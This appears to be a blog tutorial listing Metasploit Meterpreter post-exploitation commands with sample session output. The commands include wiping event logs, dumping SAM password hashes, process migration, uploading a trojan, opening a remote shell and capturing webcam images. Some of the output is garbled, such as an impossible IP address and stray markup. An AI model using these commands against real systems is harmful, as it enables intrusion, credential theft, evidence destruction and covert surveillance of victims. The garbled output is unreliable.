---
draft: false
title: Meterpreter Commands
linkTitle: Meterpreter Commands
translation_key: metasploit-meterpreter-commands
date: 2017-05-14T12:47:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Meterpreter is a powerful tool that allows you to control a remote computer. In this article, we will examine the commands that can be used in Meterpreter.
url: /metasploit-meterpreter-commands/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
weight: 80
---
In the previous article, we briefly explained what Meterpreter is. Now we will see the commands that can be used in detail. Although almost all commands are explained here, a few commands are left out because they can only be understood with experience. We will clarify them in time.

## Meterpreter Commands

## help

As the name suggests, when you give the `help` command in Meterpreter, it lists the available commands and gives short explanations.

```bash
meterpreter > help

Core Commands
**==============**

Command Description
------- -----------
? Help menu
background Backgrounds the current session
channel Displays information about active channels
...snip...
```

## background

The `background` command sends the active Meterpreter session (session) to the background and brings you back to the `msf >` command prompt. You can use the `sessions` command to switch to the background Meterpreter session.

```bash
meterpreter > background
msf exploit**(**ms08_067_netapi**)** > sessions -i 1
> Starting interaction with 1...

meterpreter >
```

## cat

In Linux operating systems, the `cat` command is used to print the content of a file to the screen. It does the same thing in Meterpreter.

```bash
meterpreter > cat
Usage: cat file

Example usage:
meterpreter > cat edit.txt
What you talkin' about Willis

meterpreter >
```

## cd > pwd

The folder change is done with the `cd` command. The `pwd` command can be used to see which folder we are currently in.

```bash
meterpreter > pwd
c:\
meterpreter > cd c:\windows
meterpreter > pwd
c:\windows
meterpreter >
```

## clearev

The `clearev` command means Clear Evidence. It tries to clean the **log** files created in the session opened on the other side.

```bash
meterpreter > clearev
> Wiping 97 records from Application...
> Wiping 415 records from System...
> Wiping 0 records from Security...
meterpreter >
```

## download

It is used to download a file from the other computer. The downloaded file is saved in the folder you are in on your local system when you start metasploit.

```bash
meterpreter > download c:\\boot.ini
> downloading: c:\boot.ini -> c:\boot.ini
> downloaded : c:\boot.ini -> c:\b<a href="http://oot.ini/boot.ini">oot.ini/boot.ini</a>
meterpreter >
```

## edit

The `edit` command opens a file on the remote computer in the `vim` editor for editing. For Vim Editor usage, you can visit [Vim](http://www.vim.org/) page.

```bash
meterpreter > ls

Listing: C:\Documents and Settings\Administrator\Desktop
**=================================================================**

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
.
...snip...
.
100666/rw-rw-rw- 0 fil 2012-03-01 13:47:10 -0500 edit.txt

meterpreter > edit edit.txt
```

## execute

The `execute` command allows you to run a command on the other side. If you notice, Meterpreter's own commands are not run. A command is run on the other side's command prompt.

```bash
meterpreter > execute -f cmd.exe -i -H
Process 38320 created.
Channel 1 created.
Microsoft Windows XP **[**Version 5.1.2600]
**(**C**)** Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## getuid

Displays the user ID of the system on which Meterpreter is running on the other side.

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

## hashdump

The `hashdump` command reveals the SAM database of the other computer. Of course, as we mentioned in our previous Database article, if you are using Workspace, it records it in the `loot` table.

```bash
meterpreter > run post/windows/gather/hashdump

> Obtaining the boot key...
> Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
> Obtaining the user list and keys...
> Decrypting user keys...
> Dumping password hashes...

Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAss ist:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
meterpreter >
```

## idletime

Shows how long the remote computer user has been idle.

```bash
meterpreter > idletime
User has been idle **for**: 5 hours 26 mins 35 secs
meterpreter >
```

## ipconfig

Displays the remote computer's network information.

```bash
meterpreter > ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address : 127.0.0.1
Netmask : 255.0.0.0

AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC: 00:0c:29:10:f5:15
IP Address : 192.16868.1.104
Netmask : 255.255.0.0

meterpreter >
```

## lpwd > lcd

While the Meterpreter command line is open, the commands you give will be processed on the other computer. However, we may want to see or change the folder we are in on our own computer. In this case, we can do this without sending Meterpreter to the background with the `lpwd` and `lcd` commands. `lpwd`: Shows which folder we are in on the local computer. (local print working directory) `lcd`: Used to go to the folder we want on the local computer. (local call directory)

```bash
meterpreter > lpwd
/root

meterpreter > lcd MSFU
meterpreter > lpwd
/root/MSFU

meterpreter > lcd /var/www
meterpreter > lpwd
/var/www
meterpreter >
```

## ls

It does the same as the `ls` command in the Linux operating system. It lists the files and folders in the current folder.

```bash
meterpreter > ls

Listing: C:\Documents and Settings\victim
**==============================**

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
40777/rwxrwxrwx 0 dir Sat Oct 17 07:40:45 -0600 2009 .
40777/rwxrwxrwx 0 dir Fri Jun 19 13:30:00 -0600 2009 ..
100666/rw-rw-rw- 218 fil Sat Oct 03 14:45:54 -0600 2009 .recently-used.xbel
40555/r-xr-xr-x 0 dir Wed Nov 04 19:44:05 -0700 2009 Application Data
...snip...
```

## migrate

Our Meterpreter server may be running inside the svchost.exe file on the other side. When we want to embed it in another program, we use the `migrate` command.

```bash
meterpreter > run post/windows/manage/migrate

[*] Running module against V-MAC-XP
[*] Current server process: svchost.exe (1076)
[*] Migrating to explorer.exe...
[*] Migrating into process ID 816
[*] New server process: Explorer.EXE (816)
meterpreter >
```

## ps

Displays all running processes on the target computer.

```bash
meterpreter > ps

Process list
**============**

PID Name Path
--- ---- ----
132 VMwareUser.exe C:\Program Files\VMware\VMware Tools\VMwareUser.exe
152 VMwareTray.exe C:\Program Files\VMware\VMware Tools\VMwareTray.exe
288 snmp.exe C:\WINDOWS\System32\snmp.exe
...snip...
```

## resource

When you connect to the other computer, after a while you realize that the operations you perform are the same. For example, you almost always perform operations such as giving the `ls` command, entering the programs folder with `cd c:\Program Files`, etc. You can record these operations in a file on the local computer, one command per line, and run them on the other side. The `resource` command is used to make this happen.

The point to note here is that the first file you give to the resource command is searched in the local folder you are in (`lpwd`). The second parameter is run in the folder you are in on the other side (pwd).

```bash
meterpreter > resource
Usage: resource path1 path2Run the commands stored **in **the supplied files.
meterpreter >
ARGUMENTS:

path1: Our batch file in our local folder.
Path2Run: The opposite folder where the commands will be run

root@kali:~# cat resource.txt
ls
background
root@kali:~#
Running resource command:

meterpreter> > resource resource.txt
> Reading /root/resource.txt
> Running ls

Listing: C:\Documents and Settings\Administrator\Desktop
**=======================================================================**

Mode Size Type Last modified Name
---- ---- ---- ------------- ----
40777/rwxrwxrwx 0 dir 2012-02-29 16:41:29 -0500 .
40777/rwxrwxrwx 0 dir 2012-02-02 12:24:40 -0500 ..
100666/rw-rw-rw- 606 fil 2012-02-15 17:37:48 -0500 IDA Pro Free.lnk
100777/rwxrwxrwx 681984 fil 2012-02-02 15:09:18 -0500 Sc303.exe
100666/rw-rw-rw- 608 fil 2012-02-28 19:18:34 -0500 Shortcut to Ability Server.lnk
100666/rw-rw-rw- 522 elephants 2012-02-02 12:33:38 -0500 XAMPP Control Panel.lnk

> Running background

> Backgrounding session 1...
msf exploit**(**handler**)** >
```

## search

It allows us to search in the opposite system.

```bash
meterpreter > search -f autoexec.bat
Found 1 result...
c:\AUTOEXEC.BAT
meterpreter > search -f sea*****.bat c:\\xamp\\
Found 1 result...
c:\\xampp\perl\b**in**\search.bat **(**57035 bytes**)**
meterpreter >
```

## shell

The `shell` command allows you to enter the Command Prompt line of the opposite system in Meterpreter.

```bash
meterpreter > shell
Process 39640 created.
Channel 2 created.
Microsoft Windows XP **[**Version 5.1.2600]
**(**C**)** Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## upload

Allows you to upload a file to the other system. The target system's file notation must be observed. Backticks must be noted.

```bash
meterpreter > upload evil_trojan.exe c:\\windows\\system32
> uploading  : evil_trojan.exe -> c:\windows\system32
> uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
meterpreter >
```

## webcam_list

Lists the webcams available on the target system.

```bash
meterpreter > webcam_list
1: Creative WebCam NX Pro
2: Creative WebCam NX Pro **(**VFW**)**
meterpreter >
```

## webcam_snap

Takes a photo from the target system's webcam and saves it in .jpeg format to your local folder.

```bash
meterpreter > webcam_snap -i 1 -v false
> Starting...
**[**+] Got frame
> Stopped
Webcam shot saved to: /root/Offsec/YxdhwpeQ.jpeg
meterpreter >
```
